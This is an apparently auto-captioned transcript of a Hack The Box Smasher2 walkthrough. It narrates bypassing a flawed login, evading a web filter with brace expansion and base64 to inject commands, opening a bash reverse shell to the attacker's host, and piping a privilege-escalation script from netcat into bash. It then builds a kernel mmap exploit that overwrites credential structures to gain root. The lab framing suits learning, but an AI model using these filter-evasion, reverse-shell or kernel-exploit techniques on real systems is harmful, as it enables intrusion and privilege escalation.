 what's going on YouTube this is if sack me doing Smasher 2 from hack the box and as far as the web show goes I'm only gonna be covering the unintended way which is a bug in the code that lets you pretty much just bypass the password I know a lot of people want me to cover the intended way which is dereferencing a garbage collection method in cpython I believe but I spent a good 10 hours trying to understand it in a way that I can explain it and every time I thought I understood it something happened that just made me question everything so instead was spending a large amount of time trying to come up with that I'm just gonna skip it because we have a way to bypass it and maybe we'll come back to it in another video but once you get past these login prompt we do a pretty cool web filter evasion technique to get a shell on the box and then with that shell there is a kernel module that allows you to exploit memory mapping in the kernel space to the user space to overwrite a credential structure to make your process run as root so with all that being said let's just jump into the box as always we start over there and maps are - SC for default scripts as V enumerate versions o a output all formats plan the end map directory and call it smasher - and then the IP address which is 10 10 10 135 can take some time to run so I've already ran it looking at the results we have just three ports open the first one being SSH on port 22 and it's banner tells us it's a Ubuntu box then we have DNS on port 53 and it's banner tells us the server hosting DNS is ISE bind and also that it is on TCP which isn't all that uncommon the one main difference between DNS on TCP than UDP is that TCP is capable of doing zone transfers so it's just something you should always test when you see this chances are it won't allow you out in the wild but sometimes you get lucky then finally we have HTTP on port 80 and it's banner tells us it's Apache HTTP D and also that it's Ubuntu and the title is a 4-3 for binnen so let's just go take a look at this HTTP page real quick because it's a quick check so 10 10 10 135 and we don't look like we get a forbidden page let's just try a few directories like slash robots texts and we get not found this looks like a 404 so what I'm going to do is go to foxy proxy enable burp suite refresh this page go to proxy senator repeater so I can see this request and it is indeed a 200 requests so whenever I see something that doesn't really make sense because and maps telling me this is a 430 forbidden I want to check it out because this may be a key thing on why a tool doesn't work so say you this isn't working because of some type of dirty word filter around the user agent and I don't know that and then I run go Buster against that and I go Buster keeps getting forward 3 is when it shouldn't so always try to figure out exactly what's going on in these type of situations so nmap - I see - SV - p 84 port 80 10 10 10 135 Wireshark is listening so now when I click go we can analyze what ad map is doing so I'm just gonna say HTTP and then let's examine a packet so right click follow TCP stream and that hockey is control shift T for future reference so looks like a get request does get a 200 we don't have anything else in our header so let's close this out and then look at another HTTP packet so let's go to post let's see this one looks like it has some more data so let's go to 400 TCP stream and I'm not exactly sure what this is doing here but the server responds with a four bit and 403 so not sure exactly what that one was about let's try to find another blank request so here's a get request on HTTP 1/1 fishing enough the very first one was 1 / L we do follow a stream and here we are getting a forbidden and we changed this 1.0 to a 1.1 and added all these strings most importantly we added this user agent and that's generally where you're gonna find filtering around so let's go back to purp first if we change 1.0 200 okay 1.1 200 okay nothing there so let's take our user agent hell and put earth and map 1 in and we get a 403 forbidden so let's try to figure out exactly why this is blocking us so I'm going to put the user agent - and map with a capital and in lower case n to see if it's based around the word and map and it's not so let's take this Mozilla out to see if it's based around a whole user agent doesn't look like it is we still get forbidden take out the compatible we get forbidden take out nmap and we get a 200 ok so let's start taking off from here click send forbidden 200 okay get this with just and map an engine so it looks like there is a blacklist around and map scripting engine nothing too interesting just I guess keep something in mind whenever we run something make sure user agents are up to par so I'm gonna copy this user agent out because the next step is to run go Buster and I should just user user agent I know that works so go Buster dir - you URL HTTP 10 10 10 135 - W word list user share word West der buster directory list 2 3 medium and then we want to do what is it I think party - eh I'm just coming double chat dir - H that's good - Buster go Buster dir - H and we see - a is the user agent string so - a and it copied that so let's just delete this go back here and copy this paste okay and then - oh for out while I'm going to call this go Buster root dot out there we go so go Buster is running while that runs let's check out a zone transfer so syntax for that is dig axfr which means zone transfer dig is just a DNS client then at the name server so one through ten ten ten one thirty five this is the server that's hosting DNS and then you got to give it the zone so the zone you just had to guess this one because the box is called smasher to on hack the box you just do smash - 2 . HDB and it dumps the whole smash - 2 . h TB zone if you just did h TB it doesn't work so you need that smasher - so we get one new host name out of this so domain name it's wonderful session manager dot smasher - h TB so let's copy this go into a host file and paste it so 10 10 10 135 and i'm also gonna do smasher - h TV so it's ping that to make sure that now resolves it does so let's turn foxy proxy off and just go to like smash of 2 h TB we get the apache page and if we go to wonderful session manager dots master - dot h DB we get a actual website so i'm just looking down to see if there's any information we get some potential user names to try john McCaffrey Robert Anderson Ali Sanders but nothing too special looking at all these links I'm just looking at the bottom left of my screen and everything is going to slash pound except login so try now for the next login manager I'm gonna try admin admin click login we get authentication failed guest guest try login be able to again so got something here I'm try SQL injection so or 1 equals 1 and whenever I use SQL injection doing count that probably exists like admin and we just get error so if we do password then single tick we get false I wonder if I can go here real quick and unmask this this will be easier for you to follow see type there we go there we go now we can go with this so or one equals one actually Airedale so if we do like this error again here so test based test I'm trying to figure out exactly what is causing the error message and it looks like the password can't have a space so that is definitely interesting try admin password click well again and nothing really interesting with this login form so let's go take a look at our go Buster and we see slash back up so let's go to this slash back up whoops and URLs not found because go Buster is running off 10 10 10 135 so here we go and there are two files so we can do Save Link As and save link as and then let's move those two files into a directory make der HTTP and then let's get us go in there CP downloads slash star here and I guess I can clean my downloads folder so let's just remove them there are two files one Python 1c library so two files SSO it is an elf but if we look at multi we have a Python file and it looks like it is a flask web application which is a web framework in Python but this very first import statement import SCS this is going to import the ssso and load a bunch of functions from this this is a C Python thing which is Python code calling C code so all the functions we have here probably aren't can be all the ones we actually have access to because some of them will be coming from the C file so one of the first things I want to do I guess we can kill this go Buster but I want to open the sass not sa file up and gira so just doogie to run and this will show us all the functions we have total so let's make a directory actually called a goodra and then file a new project deidre that's not a so open up the decompiler and then press i to import and then we want to go to route there's htb route again run route htb foxes slasher to h-2b boxes smasher to http ASL system provider file import file root H to be boxes smasher to http there we go I'm not sure what hockey I was in earlier but we're good now so let's analyze the function and while that runs I guess we can go back to this Python code so let's see I'm going to grep for death on this real quick correct death off PI to see all the functions we have and the one I'm probably most interested in is maybe log underscore creds so log creds and it's saying with open creds dot log right login from I guess use a IP address and then username password so I want to definitely check out creds dot log so let's try creds dot log and I'm in burp suite so let's turn off we get a forbidden so we can't open that file if we go to 10 10 10 135 threads dot log we get a forbidden as well so can't access his file this bowels name itself is off PI and I want to go down this rabbit hole because well I got a forbidden on 10 10 10 135 for creds not log and a forbidden on this DNS name as well so if we try off dot pi we get not found and all stop PI here we get not found as well I'm going to try to go into this directory just a longshot not found I go to like robots which probably let's go to backup slash cards dot log forbidden so anything that ends in creds log is going to be forbidden so that's why we had that data that result it's not because we actually got to read the file or could have read the file if we have permission it's just Apache or whatever is configured to block any access to the file credit log so let's see get manager and nit manager we don't have any like login request here and all stop aye so I'm just going to search for log in and we get log in redacted redacted if we had read off dot PI we could have pulled the server the version that's not a backup and maybe got in let's see cess dot session manager login craft token so right here this is calling whoa do not mean delete it the see file the assessed on SL and then session manager and then doing login so going down we can check for more logins so route is slash auth it's a post request and we analyze this post request so admin admin and we can send this to burp suite go here well again sent to repeater click go but we can see exactly what it's sending so action is he go to off and then sending a data I guess that's a drawing a blank on what type of variable this is inviting on but anyways it's sending a username and password as well so that's why with this request get JSON is dictionary it's sending a dictionary so temp login is equal to the contents of data and then what's it doing with temp law again it's going to try temp user login and temp user login is this a variable user logon it's not none wall creds so this looks like it's a function within this C thing so let's go take a look at the C code and if you can't tell I've before this box I've never used C Python so that's why this whole sections probably iffy on benefit but looking into session manager thing we have a check login function and here we have manager check login so this is what we want I don't know why we called this temp login I'm not exactly sure what the benefit of that is data if yeah so we're calling check login and we're passing it the entire web request which includes this action off so this temp login confused me I was like why are they yeah I don't know just weird but the passing this entire line to that C program check login so this is where we want to start and I just have Deidre split so I have assembly in this tab and D compound in this tab you just like click the window and drag it over to break it out the reason why I did this mainly is because I increase the font size so it looks really horrible splitting these two but when we never you go into the decompile output it's very intimidating at first but less intimidating than looking at the assembly and the benefit to the decompiled is you can go through and label things so let's go and take a stab at this and this is um big help from nuts no scan but let's pull up the blog post real quick because I'm doing this Fox after it got retired I had the benefit of reading write-ups and this one was a big handy to me because he kind of did what I'm going to do here and renamed bunch of variables so and it just shows how easy this makes it so the very first thing we have this whoops don't want to go there let's go back to functions session manager check log in renoise let's see come on I hit control Z and then it undid the analysis so that's why I'm analyzing it again check login okay so wrath of bat is doing this pi aaaggghhh parse tuple so what we can do is go PI argh purse to pool and see exactly what this looks like and this is not great being the size the text is let's see so 3 where's the calling function maybe a different page if you read this whole thing you would see exactly how it's used you do pie ugh parse tuple and then the argument and I want to say format is next and the format is these ASCII characters so I'm seeing pirate Perce tuple per m2 this is the argument this is the one we passed here I'm going to guess / M 1 is probably going to be action equals off oh no I don't know exactly what Bram one is but pram 2 is probably going to be all this HTTP data so I'm going to press L to rename this and then I'm just going to put raw HTTP POST data so the next thing is the format and it's pointed right now to just an address so if I double click this and then go into the assembly output we can highlight this because it doesn't know what type of variable this is so we can just say hey the data type is going to be a string and now it is Oh's which this will fit the colon convention as you see the format here store a Python object in a C object pointer so then we get the next two and we don't know exactly what these are so we'll 68 not sure just going through [Music] so right here we have Seaver - dick contains local 68 and then this dad so let's double check the static n by double clicking it and again it couldn't tell this was a string so let's just hope the decompiler out by saying it's a string going back here so now dick contains data and if we look at the post request it's checking if this is here so this has to be the exact HTTP POST request so this will be let's just call this data because it's checking if this exists actually let's call this purse data because just data would be this we're calling the entire string purse data so the next thing local 70 we can see where this is used and this is checking is blocked can login set unblock so a bunch of things around what it probably credentials so I'm just gonna call this one data so right now I'm taking a leap of faith I wonder if I can do data maybe right now I'm just taking a leap of faith that that is only this that's why I have them maybe I don't know if I can do question mark yep I can so let's keep going back down c VAR - so this sivir - looks like it's always being used for some type of boolean check so this one right here is being if first date if data is in this variable down here is checking if the user is blocked so I'm just going to call this boolean check and then we can keep going down missing data parameter and that's jumping to this function going down here we can just see subroutine doesn't return and it crashes or not crash but exits so oddly enough you can't just hit L here to rename this you have to go into the assembly and then we can rename this to exit so now the decompiled shows it is exit and let's see this boolean check I'm going to do a semicolon to put a comment and this is gained four data parameter I'm just going to copy this because we're going to apply it to a few things so this next piece is right here let's see you long so Ivor - this looks like it's going to be a counter so right here it's checking for the number of arguments so we can just put count number of eggs and now this checking for dict so just going through and commenting this decompiled and right here it looks like this where we begin so begin login and again that's semicolon to get into the comments so this local 58 don't save this is actually going to be data I keep any semicolon because I was in comment mode but this is data because this is just getting the dictionary key data out of post data so not exactly sure what this one was but we know it is going to be potentially the session manager because this has credentials and everything so if is blocked the session object no now we're checking can wall again so counter again it's getting the login count for the user if it's less than ten set the last login whoops let's just do here we go back this is checking if username exists so check if username exists and data copy because we have one for password okay so now we're assigning usernames so signing username PW so looking at these four lines we're getting username out of data and password out of data and then we're converting them to strings so I'm gonna call this username row and then this one will be password raw this will be username and this will be password okay and now we're getting internal user and then getting internal password and then comparing the password and this is going to else I'm guessing this is if logon counts greater than ten set it to blocked but right here is interesting so let's check the get internal user and see exactly how this works so double click there we're passing it a parameter we know the parameter is going to be credentials we're not passing it the username we're passing it the whole parameter I believe so if we go back to check wall again scroll down yeah get internal user session manager so it's a bit odd to do it this way because we just define the username here but we're passing it the whole object into this gif to internal user thing so that's why I called it credentials so P 1 V is equal to cadential user login so let's call this I don't know what that one is so get list item so this will be credentials 0 whoops I'm in comment mode no credentials 0 and I'm calling it 0 because it's getting the item and this will be creds it's getting the item out of this and skinning 0 I'm guessing creds one will be the password because we passed it the whole object and then returning cadential 0 so let's go back here and then missing user name get internal user return good ventral 0 this is session manager 0 and then let's go look at the get internal password and do the same exact thing so pram 1 whoops is going to be potentials and then we can call this creds how do I keep hitting L semicolon Oh creds and again this is doing the same exact thing and doing credentials zero so both of these functions are returning the username because this object is most likely going to be one for the password and if you wanted to double check this at this point we can always load this up in gdb and validate but if this is true then we don't have to brute-force the password we just have to brute force that username because the password is going to be the username and this was a mistake not the intended route an actual mistake in the program the intended way is through ad referencing garbage collecting that I'm not confident explaining so most likely I won't explain it that's what we're going out through this route but the step to gdb is let's open up Python and this I think has to be Python too because if I did Python 3 and did imports s we get a error message so I think this program is meant for Python - so let's import ses and then what I want to do is look at everything else in off PI to see things we need to import we don't want to input flask because I don't have that installed but I want hash Lib we probably want H Mac maybe OS base 64 that should be good so let's get these two functions the Kraft secure token and other things so I'm just gonna cap this now unless can we just paste this in so copy paste sweet so let's see where is login here it is we have login equals redacted redacted and then we're creating the session manager object so I'm just going to not copy it just yet but we can do login is equal to Epsilon session manager I'm just going to copy and paste copy this and paste and this has to equal something so we'll do s equals and now the next thing we do is create a data payload this is the HTTP POST request so we'll do creds is equal to username eps ACK and password please subscribe if you look at creds that's what it looks like that looks good and then D is equal to theta and creds let's look at D that looks fine again we're doing this because of this so we could have done this action all thing but scripts not using it it just cares about data so that's what we did so let's see now we can do s check login and we'll do D we can see false you don't look at everything you can do you can do D IRS so you can see all the options you have check login is the interesting one so with that we can go into gdb and debug this so PS - EF grep for Python gdb - seven seven nine two and what we want to do is set a breakpoint so I'm going to break on we want to look at the output of this what do you both will do get internal PWD and get or that was the other one username so scroll down let's see user so get internal USR and get internal PWD so get internal USR and PWD so we set those two break points and we can continue alright run check log in and if I maximize this go all the way to the top it'll say we hit break point one not sure what says that but we should have hit three point one see what can we verify this USR we'll just keep going it's weird not having my oh we seg faulted bad strim have happened Python I'm just gonna pause the video and retype everything to get or a session back maybe we screwed up something so I typed out pretty much everything I did before except I left two things in we can get rid of this flask and whatnot so we can't test up pi we can just copy this into a Python interpreter so copy it in there and we can do s dot check law again D ok so now let's quit gdb do this PS again gdb - P seven eight three two and break get internal USR and PWD continue estart check login okay this time it broke correctly so we see reason breakpoint I think it said SIG's up here before so I should have caught that but anyways we see it stopped on the breakpoint and the function where n is get internal user so we can just step through this and you can look at the registers as it goes the key thing here being all the registers and gdb or GEF or Jeff will kind of help this but remember the calling convention of 64-bit registers and that means that our ax is going to be the output of whatever you call a command a function of whatnot and then the arguments when you do a call go in the order of r di r SI r DX r CX r8 and r9 so you just really have to remember probably three are dir Si and RDX and then remember our ax will be the output of calls so you can look at what the register okay now nothing too interesting but once we start moving through things should start making sense so let's see where are we now I want to get to this call so I'm gonna do s3 and then go one more so we're at this call PI object get attribute string and if we go back here and look at let's see get into own us are this is exactly where we are and after that we'll get item and other things but this is in the code we go here let's see call if you look at before move rd i ra x and then a load effective address move credentials so our di is going to be a credentials object and lo and behold that is the very first argument when you call something so that makes sense and then before that is le a load effective address but yep so we look at the second argument which RSI is the second argument so if we do X / s RSI you can see user login so I'm not going to go into this instead I'm just gonna do n to hop over this and then I'm gonna check out what are a X's so x /x s ra X it's just three I'm not exactly sure what it's doing here but if we go a few more times we get this get item so if we look at that we are right here we can step over this it's now set to two and then we got a pie string so this is getting the string so N and we get hip sack so we finally got through here it pursed all this and grabbed the username out of the credential object and that's exactly what we expected so if we do see to continue we're going to hit breakpoint again but this time when break point two which is get internal PWD so I'm just going to do X slash 50 I to look at the next 50 instructions maybe 25 I specify a starting point which is our IP there we go so what I wanted to do was just skip all this and go straight to here and I'm not exactly sure what X slash 50 I was looking at when I didn't specify anything but when I specified our IP that says hey use my current starting point as the point of entry so let's see show it down to 20 okay yeah I wanted to go straight to here so I'm just going to copy this break star paste the address continue and we'll hit another breakpoint and let's see this is calling the PI string thing so I'm just going to hit n to go next to hop over this call and then we'll examine our a X so X slash s ra X and that's if Zack so that is it getting upset for both the user name and password I'm sure if we step through this a bunch more maybe if I just do 10 next next 10 let's go si and then return back in to check login whoops let's do X / 50 I or IP look at the next 50 things that are interesting so we started here so let's see we're doing a call to string compare here so let's break and see exactly what it compares so copy this bestir paste so anything else we want to look at calling something check login and let's just look at this string compare so continue and let's see doing a comparison and not sure exactly why already eyes here as please subscribe but it's comparing RSI n RDX at least I think it is so the easiest way to figure this out is it here n4 next and then look at there value in our ax if it's zero then it compared RSI on RDX if it's one it compared our di and RSI and I have no idea what's going on in this program anymore and if it returns to well then so something failed magnificently so let's just do N and let's look at what our ax is so x /s our ax I need a like I or something or ax that did not return where I thought it would I was hoping to return the thing so maybe everything this video you can ignore because my understanding of this has just went out the window EA X so x / i VI x x /s VIX let's see it's taken reason Z so I'm guessing we took a jump right after that and let's see let's see where are we returned session compare this this this so I think we got to here and we took it so I think that's good and this could also just be because we're not running this on the server but yeah I am utterly confused I'm gonna try this one last time and we'll see if we get it so where are we now break point get internal password you can do next info be I do have another breakpoint that's on the check login so we broke on this string compare so if I hit n this re X is going to go crazy so let's do s and then we jump here over in at string compare now X / 10 is-5 okay let's continue do this again continue continue continue we're here and string compare so I want to break right here so if I do continue we did not hit that break point okay so now we're here x /x r ax 50 so n can access memory I'm not exactly sure what's happening I'm guessing string compares putting in a different register than I'm expecting but that'll be the end of me flail flailing around in gdb but hopefully you picked up something and maybe you can use gdb in combination with this decompiled output to kind of get an idea of what variable should be because you can always just set a breakpoint on like get key and then analyze where you should be so we'll just do that and then call it a get for this and hopefully this is successful because I have not been having luck with disassembling this today so del 1 2 3 4 so you could just set a breakpoint on get key and then continue and it's seg faulted I'm not sure what's going on but I'm done with gdb for today so sorry about that hopefully you pick something up if not then oh well so with all this being said we know that if the username and password are the same we'll be able to log in so we already tried admin admin and we get too many tentative wait two minutes so I'm locked out so maybe that's what happened with that seg fault is I got locked out and that's why the application seg faulted because they didn't know how to handle it so I'm gonna wait two minutes like it says and then we will continue on with the video so it's been the two minutes and I tried again and we got an error message so I'm gonna try a different user let's try guest guest and the reason why it has a lockout is the garbage collection dereferencing intended way you're actually supposed to exploit the lockout and upon the final failed attempt you trigger an exploit but and is really complicated and I don't fully understand it so just trying various usernames with the same exact password do administrate it with a capital A you get a API key so now we got a new endpoint that we can access API slash API key slash job and this is the key so if we go back into our code and then we just search for like API let's see whoops let's search for API we get the secret token and this is on login so that's not what we want here we go a prowl slash API slash the key job it is a post request so let us but this in a new tab so we want to do API slash key slash job and we have it as a post so let's see what it wants so it's saying request get JSON and let's see if data type data is dict if schedule is in data then we do out is equal to data schedule so just like the login we can do action this doesn't really matter because it's only checking data and what it wanted was schedule okay and we can do echo test click send missing scheduled parameter sche d UL e so let's see SCH ii d UL e thought i had that right maybe only am i so let's see what is it looking for oh I see it's not actually looking for the data piece this is the first request and is the variable so if I get rid of this action data just reusing variable names confusing me but if we look at this click send there we go we have command execution so if you look at the login we can potentially see the difference so let's see the turn authenticated data so right here is what it did before what we had the nested data so we see data and then dict data and getting the data value so that's why on login you have this data value because the dictionary is getting that if you go back to the API endpoint it is not where is that JSON data schedule so again just slight confusion because of variable names but now that we have code execution we can move on and try to pop the box so let's see the very first thing we'd always do is try to get the reverse shell so 10 10 14 three 9001 zero and one so if I go up a new thing and cl BMP 9001 let's if config tun 0 10 10 14 to my ip's change since I last did this ok click send and we get or a forbidden so it looks like there's some type of web filter so let's try echo test and then click send and we get a forbidden so let's find out which these words is blacklisted so let's get rid of test and just do echo and we get success true we just put in test we get a internal server error which is different than what we got before which was a 403 forbidden so it looks like maybe the Web Filter just doesn't like spaces so we can try just doing o space test and we get it forbidden so of course if we do let go Itzik it is also or a forbidden so it definitely does not like spaces and before we continue I just want to highlight one thing because I'm gonna start using it from here on you go to options miscellaneous and scroll down to issue repeater request there's a hotkey to issue this so if control space isn't working for you go in this setting and set it so then whenever you press control space it issues the request so the next thing I'm going to do is take advantage of bashes Auto expansion and that's by putting this all in brackets and then using commas where I want spaces and we can get around that filter so what this is doing is just taking advantage of bash doing the processing before it sends it so if you do echo up sack it just echoes that you can also use variables that are defaulted to space so like ifs the internal field separator its default is a space and you can see it working like that additionally like stir that's not going to be sent to like the colonel with Starr what Bosch is going to do is go pull every file or item in your current working directory and then send that so that's why if you have too many files in wherever you're working and you stir bash will warn you additionally that is why like we had a file called I think - n so if you do LS and I do LS star it's I mean echo star maybe it didn't work that way ignore that train of thought I think - n has to be at the very beginning we do Oster and then we touch - la and do LS star we can see the output was different because it ran LS a bunch of the files like if we do LS kita go Buster and AD - LA anywhere it accepts that as arguments so that's why it worked with LS but not echo so and that double - all that means is don't process anything as an argument so that's why I'm doing it that way so with that being said there's two other things you can do you can put blank things so like whoops I probably should have done please subscribe double quotes work escapes will also break it because a single backslash is just an escape so you escaping something that does nothing which means you didn't really escape anything so there are ways to get around that also you can use like question mark I thought you could use a question mark maybe echo is not one can Who am I huh I thought I could have done that ignore that then maybe I'm thinking something else but with all that filtering and our heads we can now probably do this box so we want to do a base 64 operation on this click send or control space and we get forbidden so let's just break base 64 up and we can so this is important because now we can base 64 things so what we can do is go back and do a bash of a shell so TCP 1010 fourteen to nine thousand one zero and one is a reverse shell so we can I don't have to copy this yet we want to echo this and I just want to make sure the syntax is correct it is so what I'm going to do a 64 this and then we can go back into this and echo the base 64 and then we try a base 64 - D and remember we can't use spaces so we do it this way whoops s - s - t forbidden don't like the - D so let's separate the - and the D and we get this so this is a command so the next thing we can do is - so if I do that nc command again and send this we don't get response back because we got our shell so now we're a loop privilege shell on this box so we can do two things we can either drop an SSH key or upgrade a shell with the Python - simple PTY I'm just gonna drop a SSH key so if we go seedy to home make the SSH CD de SSH and in this window let's do I think keygen SSH - key Jen that's it generate key let's just save it in here call this smasher - no passphrase OS and we can cat smash it - dub copy this and then V authorized keys paste did I actually do that correctly did that work if it didn't work then we can redo it but it looks like it did I was questioning it because vim aired out saying like the weird terminal thing so now chmod 644 the private key chmod [Music] 610 or zy at 10 10 10 135 and with specified the key name and see if this works there we go so now we got a SSH prompt so I'm just going to exit this and we have a legitimate shell on this box so let's try to press the first thing I always do check sudo it ask what password we actually don't know his password so let's move on we can go into s manager and look at off PI for that log in command and try this password an administrator and this was administrators actual password super-secret admin password 1 2 3 bang so we can try this for the user to see if there's a password reuse type of thing going on and it's not there we can try it for root and we can try checking for the users on the box and it doesn't really look like any so the next step probably is to run Len peas Linux privilege escalation awesome sweet I believe is where it stands for so OS opt privilege escalation awesome script sweet and go here and see LVN P 9001 and we can just curl 10 10 14 to 9,000 oh wait we don't go we NC 10 10 14 to 9,000 won and pipe that output to bash and I forgot to do that so let's copy this paste and now it is running the script I think it's done now we'll see but we can go back and look for a pipe bash command and then just go down this list so let's say we can do ping and then see if a network discovery well it's only one box so you don't care about that looking at the path nothing too interesting right now maybe if we have a set UID binary we could exploit that but ignore the path looking for a signature verification and D message and we see this so what this message is saying is hey there's a kernel module that is not signed installed and that module is D hid so definitely probably should take notes of that so let's paste this and then I'll go over a few things we'll look at but that's the main thing we want to hone in on I never want to go away from looking at the analysis so quickly though I always at least want to see like the processes running and things like that now you can see this previous script is awesome because it highlights the colors of users so that's really cool cron jobs updated versions see active ports localhost 5000 so that's probably just going to be the Python script 953 I don't know what that one is maybe the laughs I don't see oh there's 80 so now saying the Python is probably here maybe something's there once we get root we can see everything but port 80 is probably the Apache with WebEx the web filter that directs you to port 5000 so that's why what that is so users highlights important users but enough going through this the I guess one thing we can look at real quick is the Apache configuration if we can let's see CD sites available cat costume so five thousands the Python script - Earth 9 5 3 I think it was SSL MP let's do SSL NP t for TCP s s is just a new version of netcat and it was 953 so I don't think Apaches directing anything here because I searched all configs for it we could try got - uh 953 bunch of weird stuff and SSH but not exactly show at 9:53 is but let's move on to this kernel module validation failed so d hid so do we have access to the locate command locate D hid and we can get to that kernel module so let's download this and analyze it so go back here we can do SCP I Smasher to DZ o n e RZ y at 10 10 10 1:35 paste and now we have the module so we can go back into Hydra close that we don't care about saving that open a new session all right to import and we want to go up one directory and it did not like me typing that dot dot there we go bhi dko click ok analyze it analyzed ok and then we can go into functions and look at things we have so we got a few device things so dev and map open read and release so if we look at read its gonna copy something to the user and it's gonna say this is the right way please exploit this we look at open let's see what device it is does this say device let's see print Kay look at this go back into the assembly this is saying the device has been opened digit times or integer let's see device create doing have code for this knit module let's look at net module and look at this so this is where it's getting initialized so we have register device we can look at this and that is D hid so we can say that wonder if we say this a string if we probably want to say it's a struct not sure what that did okay that's fine so rows your device and looking through this let's see print device create so we could look at this command because this is just C so if we look at device create and see this the final thing is going to be the device name I think yep the string for the devices name so we can look at everything about this device but we know it is D hid so if we go back here we do LS /dev D hid there is a device there and that is registered to this kernel module if we try counting it to view the contents weird stuffs gonna happen so it's gonna output T's and I'm trying to kill it now with control C but it filled out my buffer so it takes a little while so what we should do is create a program to read this and the easiest way is to go over just what's know scan did so we're not typing everything ourselves but I really like how he approached this so instead of reinventing the wheel and typing C gonna highlight something cool he did D hid that's what he's talkin about right here so a copy is code V read see paste and we can go over this just including standard libraries defining the buffer length this is going to be the amount of data we read which is 256 so start off by initializing the ret which is probably return value and FD which is file descriptor opening dev D hid for read and write and if this fails print the error message and then upon success read the response from the local kernel module if it can't read the message print fail and then print the message so super simple let's do GCC Oh read read dot C and execute read and we can just see we go through and it kind of read the Vice which is pre-programmed to this so the next part is exploiting M map so the first thing probably to do is go and Google what the heck M map is so if you search for this and read the wiki you can see it's a POSIX compliant UNIX system call that maps a file or device and memory map so it stands for memory map and because this is running in the kernel and we may have access to perform this function through the D hid block device we may build a map device within the kernel to our user space and then edit it so that's kind of what the exploit is and this again is going pretty much beyond me because I haven't done this before this box but if you search for like exploit kernel and map maybe driver as well oh no I spy kernel and map we see this labs dot F secure thing which I thought was it maybe it's not I'm gonna say driver and let's just put em w/o the PDF that's what we want this is a really good article that goes over everything the article also has exploit code in it which we're going to take I think it's right here let's see it's working through the exploit little by little so let's see what we can do well the key thing to being able to map this memory is linux creates a credential structure and if you google github linux creds dot c this should go to the file within the kernel on Torvalds github but this is the structure for a credential structure every process has this and it maps out what the UID GID set UID or super UI deeds whatever these are maps out all of this and the theory that we're going to be doing is we're gonna be searching for this structure within memory because all it's going to be is a bunch of well or UID is probably a thousand because with the first user so yes our UID and GID is 1,000 so we're gonna search for a condensed ruck sure that has everything set to 1000 so we're searching for a 1000 1000 1000 1000 1000 1000 1000 and then these secure random bits which I believe is just four random bits but we're gonna search for this in memory and when we find it we're going to replace the 1000 with zeros to say hey we are root so we're just replacing the credential structure that's kind of what this is about so the first step to do is create code to create a huge memory map and that's what this is doing so we can test this out so let's copy this and step through it so the exploit Darcy I guess set paste oh that's ugly I do not like how that's copying let's see I guess we can just go type it that's annoying copy the snare and let's see what I want to do let's copy read see to exploit dot see I just wanted to keep all the headers and then let's try copying this out of here one more time copy paste % s semicolon semicolon backslash all right backslash n it's less typing so let's see it main oh and bins gonna be annoying this is gonna be a pain I'm just gonna pause the video and get this typed out so we can resume so I got this beginning piece typed out the key thing is I did change all my includes so make sure if you're typing this out you update all that and I switched it to my host OS so I have syntax highlighting so all this is doing is getting the PID of the current process opening a device and this device is not going to be the MWR device this is going to be d h ID and then if it fails to open return 0 if it then print okay and print the file descriptor and then let's go and map the memory so this is going to be the amount we map and this is the starting address and then this is the actual call to a map to map it and we're mapping it with read/write and we're marking it as shared memory we don't know what this all is just go back over to the m map page and if we look at this well that's probably on it the main page format and you should see what all these means so pages maybe read pages may be written share this mapping so what says map shared these are the other options you could choose so yeah and what my turn I'll just go I just put this to another pane that was weird there we go so let's go back here and go through if it fails print failure if it's good then print that and return so let's go test all this and what I'm also going to do is create an SSH config file and that's going to make this so much easier to copy files to it from this box so go into dot SSH / config host Smasher - this can be whatever name you want it if you see me SS aging into the Kraken this is how I normally have it configured so hostname ten ten ten one thirty five user d0n e RZ y I believe port 22 we borrowing that specify point because it's the default port and then identity file is going to be root htb boxes smasher to smasher to so now if i ssh smasher to I don't have to specify anything and that also works for copying files so if I just SCP exploit see - Smasher - it has all that stuff saved so now we can just GCC - OH exploit exploit dot C and we have created it so we can just do dot slash exploit and we see us mapping the device and let's see we can get rid of that and we can validate this by just going to cat proc - 4 0 0 4 maps oh Sh smash it - and now cat proc - 4 0 0 4 maps and this is going to print all the memory this guy has mapped and we can see dev D hid it starts at four two four two four two four and goes to this super large address so if we were to change this exploit code to be instead of this giant F we really hate how this is configured 1 3 3 7 TC 0 exploit exploit C and we run this again we can see the PID change to two four zero eight one so cat Rock two four zero eight one Maps go back to the top and we did map leet but we definitely did not map as much as we thought we would where's my exploit code it's not what I expected but one two three four five six seven eight I don't know but we definitely changed it it looks like it ignored these three and just mapped 1,000 which is weird then try this one last time the exploit see let's change this to all ones one two three four one two three four GCC exploit see GCC Oh exploit exploit see resource unavailable did not like me doing that one two three four twenty-two one two three PCC - oh okay it's mapped cat Rock - for one-to-one maps and there we go so forty four zero zero zero two four two four two six thousand so that is changing how much we can map memory so let's move on and do the rest of the exploit well not the rest but the next piece of the exploit and that is searching for a credential structure so we're searching for this piece so we go down and this is the next piece of code we need so that is going right after this memory address okay call so we do unsign in UID get UID this is just going to be 1,000 it's getting our UID we can printf to say this okay and now we start coding credential structure so unsigned int go ahead i T equals zero unsigned int thread num equals 0 file unsigned we forgot a parenthesis long address so this address is just going to be going through our full address starting at four two four two four zero zero zero and then incrementing all the way to everything we have mapped so map start plus size minus zero at 40 good eye T equals zero if ad our credit I T plus plus equals UID and we go down think one two three four five six seven one two three four five six seven do one more and then get rid of that and again this is just going to this there's eight here one two three four five six seven eight so we're searching for the UID eight times eight okay and I don't know what I just did there doesn't look like it change anything so we end that if okay and now we do cred num plus plus printf found cred struct pointer cred numb so cred nom this is just gonna be the incremented version so if it finds multiple credentials this will tell us and then address Vietnam okay ADR plus plus so we increment the address and we have syntax error let's see that's going to that that's going to that this is bracket put loop and flush stand it out and we pray this is correct so I'm just going to test this and we have an error all you want right here let's see unsigned long or am I what line was that 33 and this is two M's there we go so it does compile so we can just SCP exploit C - Smasher to go over to SSH GCC - Oh exploit exploit C and try running it and we found quite a few clad structures so we're not doing anything right now now we're going to put the part of the code to actually edit the credential structure so what we have to do is after we change it we do a get UID and if we a root we say we're root if not we set this back and at the very end we're going to actually take this set back off so you can see exactly what chaos ensues so let's go and do this go back to our exploit code then exploit C so this is if match so let's see at IT so glad numb printf so right here this where we set everything to be zero which is root so one two three four five six seven eight everything is root now then we can do a a if get UID is equal to zero puts got root break and and that else then we copy this and before I did this we should have set credit i t20 thread ID equals zero and you can copy this nine paste and this is just going to be the UID so we're setting everything back okay then we exit that if statement and I think what good I probably didn't do all this correctly compiles so let's try this Smasher two copied GCC - Oh exploit exploit see do we ever get root on cred structure 